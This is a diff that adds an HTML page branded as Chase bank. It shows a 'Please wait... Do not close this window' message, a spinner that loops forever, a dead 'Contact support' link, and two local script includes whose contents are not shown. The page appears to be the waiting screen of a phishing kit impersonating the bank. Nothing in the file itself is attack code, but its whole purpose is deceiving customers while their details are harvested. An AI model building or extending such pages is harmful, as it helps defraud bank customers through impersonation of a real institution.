@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/chase.css">
+    <title>chase · Please wait</title>
+</head>
+<body>
+    <header>
+        <img src="res/img/logo.svg" alt="Chase logo">
+    </header>
+
+    <section>
+        <div class="Container">
+
+            <!-- Informational message using existing box/label pattern -->
+            <div class="box">
+                <label style="font-weight: 600;">Please wait</label>
+                <p style="margin: 8px 0 0 0; font-size: 0.9rem; color: #2a3b4c;">
+                    We're processing your request. This may take a few moments. Do not close this window.
+                </p>
+            </div>
+
+            <!-- Infinite loading spinner -->
+            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 32px 0 40px;">
+                <div style="
+                    width: 56px;
+                    height: 56px;
+                    border: 6px solid #e0e6ed;
+                    border-top: 6px solid #0057b8;
+                    border-radius: 50%;
+                    animation: chase-spin 1s linear infinite;
+                "></div>
+                <p style="margin-top: 18px; font-size: 0.9rem; color: #2a3b4c; font-weight: 500;">
+                    Loading…
+                </p>
+            </div>
+
+            <!-- Inline keyframes for the spinner animation -->
+            <style>
+                @keyframes chase-spin {
+                    0%   { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+            </style>
+
+            <h5>Taking too long? Contact support &gt;</h5>
+
+        </div>
+    </section>
+
+    <script src="./res/jquery.js"></script>
+    <script src="./res/cdn/jq.js"></script>
+</body>
+</html>
